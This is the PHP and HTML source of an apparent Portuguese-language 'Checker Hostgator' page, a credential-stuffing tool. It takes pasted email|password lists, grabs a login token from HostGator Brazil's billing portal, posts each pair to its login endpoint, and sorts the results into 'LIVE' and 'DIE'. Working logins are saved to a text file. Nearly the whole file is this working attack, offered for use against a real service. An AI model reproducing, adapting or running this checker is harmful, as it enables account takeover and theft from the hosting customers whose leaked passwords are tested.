<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8">
    <title>Hostgator</title>
    <link rel="icon" type="image/png" href="https://cdn4.iconfinder.com/data/icons/superheroes/512/hulk-512.png" />
    <link rel="stylesheet" href="http://www.centralbtn.com.br/global/css/bootstrap.min3f0d.css?v2.2.0">
<link rel="stylesheet" href="http://www.centralbtn.com.br/global/css/bootstrap-extend.min3f0d.css?v2.2.0">
    <script type="text/javascript">
     
        function catapau(){
         var count = parseInt($('#valor1').html());
            count++;
            $('#valor1').html(count+'');
        }
     
    </script>
   
   
    </head>
  <body class="skin-blue">
    <div class="wrapper"><!-- Content Wrapper. Contains page content -->
  <!-- ./wrapper -->
<script src="plugins/jQuery/jQuery-2.1.3.min.js"></script>
    <script src="bootstrap/js/bootstrap.min.js" type="text/javascript"></script>
    <script src='plugins/fastclick/fastclick.min.js'></script>
    <script src="dist/js/app.min.js" type="text/javascript"></script>
    <script src="plugins/sparkline/jquery.sparkline.min.js" type="text/javascript"></script>
    <script src="plugins/jvectormap/jquery-jvectormap-1.2.2.min.js" type="text/javascript"></script>
    <script src="plugins/jvectormap/jquery-jvectormap-world-mill-en.js" type="text/javascript"></script>
    <script src="plugins/daterangepicker/daterangepicker.js" type="text/javascript"></script>
    <script src="plugins/datepicker/bootstrap-datepicker.js" type="text/javascript"></script>
    <script src="plugins/iCheck/icheck.min.js" type="text/javascript"></script>
    <script src="plugins/slimScroll/jquery.slimscroll.min.js" type="text/javascript"></script>
    <script src="plugins/chartjs/Chart.min.js" type="text/javascript"></script>
    <script src="dist/js/pages/dashboard2.js" type="text/javascript"></script>
    <script src="dist/js/demo.js" type="text/javascript"></script>
    <div class="content-wrapper">
      <!-- Content Header (Page header) -->
      <!-- Main content -->
      <section class="content">
      <!-- Info boxes -->
      <div class="zoomIn animated">
        <!-- Main content -->
        <div class="row">
		                        <style type="text/css">





 h1{

 font-size: 40px;

 text-shadow: 0 0 0.5em #00fa00 

	 }

h2{

 color: #FFFFFF;

 margin: 0;

 font-family: Lucida Console,Tahoma;

 font-size: 15px; 

 text-shadow: 0 0 0.5em #00ff00 

	 }



	 .reprovadas{

 color: #FFFFFF;

 margin: 0;

 font-family: Lucida Console,Tahoma;

 font-size: 15px;

 text-shadow: 0 0 0.5em #FF6987 

	 }



	 .fila{

 color: #FFFFFF;

 margin: 0;

 font-family: Lucida Console,Tahoma;

 font-size: 15px;

 text-shadow: 0 0 0.5em #000000 

	 }

	 .total{

 color: #FFFFFF;

 margin: 0;

 font-family: Lucida Console,Tahoma;

 font-size: 15px;

 text-shadow: 0 0 0.5em #000000

	 }

	 .nula{

 color: #FFFFFF;

 margin: 0;

 font-family: Lucida Console,Tahoma;

 font-size: 15px;

 text-shadow: 0 0 0.5em #ffffff

	 }

</style>
          <center><h1><font color=black>Checker Hostgator</h1> </center>
              </div>
              <?php
$sock = '';
error_reporting(0);
function getStr($string,$start,$end){
    $str = explode($start,$string);
    $str = explode($end,$str[1]);
    return $str[0];
}
class cURL {
    var $callback = false;
    function setCallback($func_name) {
        $this->callback = $func_name;
    }
    function doRequest($method, $url) {
        $ch = curl_init();
        global $email, $pwd , $token;
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_HEADER, 1);
        curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']); // RADOM DOS NAVEGADORES
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
       
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_COOKIESESSION, true );
        curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/hostgator.txt'); //COOKIES  DO NAVEGADOR
        curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/hostgator.txt'); //COOKIES DO NAVEGADOR
        curl_setopt($ch, CURLOPT_REFERER, 'http://www.saraiva.com.br/'); //REFERER DA SEGUNDA CHAMADO
        curl_setopt($ch, CURLOPT_VERBOSE, 1);
        if ($method == 'POST') {
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, 'token='.$token.'&username='.$email.'&password='.$pwd.''); //POST DO LIVE REQUESST
        }
$data = curl_exec($ch); //AQUI PRA VER AS PAGINAS DE RESULTADO
        curl_close($ch);
        if ($data) {
            if ($this->callback) {
                $callback = $this->callback;
                $this->callback = false;
                return call_user_func($callback, $data);
            } else {
                return $data;
            }
        } else {
            return curl_error($ch);
        }
    }
    function get($url) {
        return $this->doRequest('GET', $url, 'NULL');
    }
    function post($url) {
        return $this->doRequest('POST', $url);
    }
}
 
echo '
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<head></head>
<style>
        </style>
    <script type="text/javascript">
        function pushPaypalDie(str){
            document.getElementById(\'listPaypalDie\').innerHTML += \'<div>\' + str + \'</div>\';
        }
        function pushPaypal(str){
            document.getElementById(\'listPaypal\').innerHTML += \'<div>\' + str + \'</div>\';
        }
        function pushWrongFormat(str){
            document.getElementById(\'listWrongFormat\').innerHTML += \'<div>\' + str + \'</div>\';
        }
    </script>
</head>
<body>
<div class="main-content">
<form method="post">
<div align="center"><textarea name="mp" rows="10" class="form-control" placeholder="example@priv8.zapata|123456" style="width:90%">';
if (isset($_POST['btn-submit']))
    echo $_POST['mp'];
else
    echo 'EMAIL|SENHA';
;
echo '</textarea><br />
SEPARADOR: <input type="text" style="width:20px; text-align: center;" name="delim" value="';
 
if (isset($_POST['btn-submit']))
    echo $_POST['delim'];
else
    echo '|';
;
echo '" size="1" /><input type="hidden" name="mail" value="';
if (isset($_POST['btn-submit']))
    echo $_POST['mail'];
else
    echo 0;
;
echo '" size="1" /><input type="hidden" name="pwd" value="';
if (isset($_POST['btn-submit']))
    echo $_POST['pwd'];
else
    echo 1;
;
echo '" size="1" />&nbsp;
 
<br><input type="submit" class="btn btn-info" value="Testar" name="btn-submit" /> </br>&nbsp;&nbsp;&nbsp;&nbsp;
</div>
</div>
</form>
';
set_time_limit(0);
include("use.php");
function fetch_value($str, $find_start, $find_end) {
    $start = strpos($str, $find_start);
    if ($start === false) {
        return "";
    }
    $length = strlen($find_start);
    $end = strpos(substr($str, $start + $length), $find_end);
    return trim(substr($str, $start + $length, $end));
}
function fetch_value_notrim($str, $find_start, $find_end) {
    $start = strpos($str, $find_start);
    if ($start === false) {
        return "";
    }
    $length = strlen($find_start);
    $end = strpos(substr($str, $start + $length), $find_end);
    return substr($str, $start + $length, $end);
}
$dir = dirname(__FILE__);
$config['cookie_file'] = $dir . '/cookies/' . md5($_SERVER['REMOTE_ADDR']) . '.txt';
if (!file_exists($config['cookie_file'])) {
    $fp = @fopen($config['cookie_file'], 'w');
    @fclose($fp);
}
$zzz = "";
$live = array();
function get($list) {
    preg_match_all("/\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}/", $list, $socks);
    return $socks[0];
}
function delete_cookies() {
    global $config;
    $fp = @fopen($config['cookie_file'], 'w');
    @fclose($fp);
}
function xflush() {
    static $output_handler = null;
    if ($output_handler === null) {
        $output_handler = @ini_get('output_handler');
    }
 
   if ($output_handler == 'ob_gzhandler') {
        return;
    }
   
    flush();
    if (function_exists('ob_flush') AND function_exists('ob_get_length') AND ob_get_length() !== false) {
        @ob_flush();
    } else if (function_exists('ob_end_flush') AND function_exists('ob_start') AND function_exists('ob_get_length') AND ob_get_length() !== FALSE) {
        @ob_end_flush();
        @ob_start();
    }
}
function curl_grab_page($site,$proxy,$proxystatus){
    $chss = curl_init();
    curl_setopt($chss, CURLOPT_RETURNTRANSFER, TRUE);
    if ($proxystatus == 'on') {
                curl_setopt($chss, CURLOPT_SSL_VERIFYHOST, FALSE);
                curl_setopt($chss, CURLOPT_HTTPPROXYTUNNEL, TRUE);
                curl_setopt($chss, CURLOPT_PROXY, $proxy);
            }
            curl_setopt($chss, CURLOPT_COOKIEFILE, "cookie.txt");
            curl_setopt($chss, CURLOPT_URL, $site);
            return curl_exec($chss);
            curl_close ($chss);
           
}
function display($str) {
    echo '<div>' . $str . '</div>';
    xflush();
}
//function pushSockDie($str) {
   // echo '<script type="text/javascript">pushSockDie(\'' . $str . '\');</script>';
  //  xflush();
//}
function pushPaypalDie($str) {
    echo '<script type="text/javascript">pushPaypalDie(\'' . $str . '\');</script>';
    file_put_contents('api/accountsdead.txt', $str . PHP_EOL, FILE_APPEND);  
    xflush();
}
function pushPaypal($str) {
    echo '<script type="text/javascript">pushPaypal(\'' . $str . '\');</script>';
    file_put_contents('api/accounts.txt', $str . PHP_EOL, FILE_APPEND);  
    xflush();
}
function pushWrongFormat($str) {
    echo '<script type="text/javascript">pushWrongFormat(\'' . $str . '\');</script>';
    xflush();
}
 
if (isset($_POST['btn-submit'])) {
   
   
 
    ;
    echo '<br/>
<br/>
 <center>
<div class="bounceIn animated">
<div class="box box-success">
                <div class="box-header">
                  <h3 class="box-title"><i class="fa fa-list"></i>&nbsp;&nbsp;&nbsp;<strong>LIVE</strong></h3>
                </div>
                <div class="box-body">
                  <div class="box-body" id="listPaypal"  ></div>
                </div><!-- /.box-body -->
              </div>
             
<div class="box box-danger">
                <div class="box-header">
                  <h3 class="box-title"><i class="fa fa-list"></i>&nbsp;&nbsp;&nbsp;<strong>DIE</strong> </h3>
                </div>
                <div class="box-body">
                  <div class="box-body" id="listPaypalDie" ></div>
                </div><!-- /.box-body -->
              </div>
             
              <div class="box box-warning">
                <div class="box-header">
                  <h3 class="box-title"><i class="fa fa-list"></i>&nbsp;&nbsp;&nbsp;<strong>Formato Invalido</strong></h3>
                </div>
                <div class="box-body">
                  <div class="box-body" id="listWrongFormat"></div>
                </div><!-- /.box-body -->
              </div>
			  <br>
			   
			  </center>
</div>
 
<br/>
 
<br/>
 
 
';
    xflush();
    $emails = explode("\n", trim($_POST['mp']));
    $eCount = count($emails);
    $failed = $live = $uncheck = array();
    $checked = 0;
    if (!count($emails)) {
        continue;
    }
    delete_cookies();
    //$sockClear = isSockClear();
    //if ($sockClear != 1) {
        //pushSockDie('[<font color="#FF0000">' . $sock . '</font>]');
        //continue;
    //}
   
 
   
 
    foreach ($emails AS $k => $line) {
        $info = explode($_POST['delim'], $line);
        $email = trim($info["{$_POST['mail']}"]);
        $pwd = trim($info["{$_POST['pwd']}"]);
        if (stripos($email, '@') === false || strlen($pwd) < 2) {
            unset($emails[$k]);
            pushWrongFormat($email . ' | ' . $pwd);
            continue;
        }
        //if ($failed[$sock] > 4)
         //   continue;
     
     
     //DELETAR COOKIES
if(file_exists(getcwd().'/hostgator.txt')) {
        unlink(getcwd().'/hostgator.txt');
    }
 
       
    $a = new cURL();
    $b = $a->get("https://financeiro.hostgator.com.br/");//CHAMADA TOKEN
    $token = getStr($b,'name="token" value="','"'); //CHAMADA TOKEN
    $c = new cURL();
    $d = $c->post("https://financeiro.hostgator.com.br/dologin.php"); //POST DA 2 CHAMADA
 
       
        if($d){
           
               
                if (stristr($d,'Sair') !== false) {
                    /*MEIO*/
                 
                    /*  $aq = mysql_query("UPDATE `usuarios` SET `creditos`='$creditos' WHERE login_usuario='$login_usuario'");*/
                   
                    /*FIM MEIO*/
                    $xyz = "<b style=\"color:SteelBlue\"><b style=\"color:SteelBlue\"></b><b style=\"color:green\">Live</b> | <b style=\"color:black\" >$email</b> | <b style=\"color:black\">$pwd<b/> | <b style=\"color:Blue\">#FrYWeeb<b/>  ";
                    /*CONTA*/
                    $live[] = $xyz;
                    unset($emails[$k]);
                    pushPaypal($xyz);

                   
                } else {
                    pushPaypalDie("<b style=\"color:red\">DIE</b> => $sock | <b style=\"color:Gray11\" >$email<b> | $pwd ");
                    unset($emails[$k]);
                }
            } elseif($dias >= 1) {
                if (stristr($d,'Sair') !== false) {
                    $xyz = "<b style=\"color:SteelBlue\">[</b><b style=\"color:DodgerBlue\">SPRITEBUG</b><b style=\"color:SteelBlue\">]</b><b style=\"color:green\">LIVE</b> | <b style=\"color:black\" >$email</b> | <b style=\"color:black\">$pwd<b/> | <b style=\"color:Blue\"> [DIA:$dias]<b/>  ";
                    $live[] = $xyz;
                    unset($emails[$k]);
                    pushPaypal($xyz);
                   
                } else {
                    pushPaypalDie("<b style=\"color:red\">#Die</b> => $sock | <b style=\"color:Gray11\" >$email<b> | $pwd ");
                    unset($emails[$k]);
                }
            } else {
                echo "<script>alert('Você Não tem mais creditos :/ Minimo são 5 Creditos ')</script>";
            }
        }  
       
       
       
       
       
       
       
       
       
       
       
       
       
       
       
       
       
    }
    if (count($emails)) {
        display("Sem Testar:");
        display('<textarea cols="80" rows="10">' . implode("\n", $emails) . '</textarea>');
    }
 
echo '</body>
</html>';
?>
            </div>
          </div>
        </div>
        <!-- /.row --><!-- /.content -->
      </div>
      <!-- /.content-wrapper -->
  </body>
</html>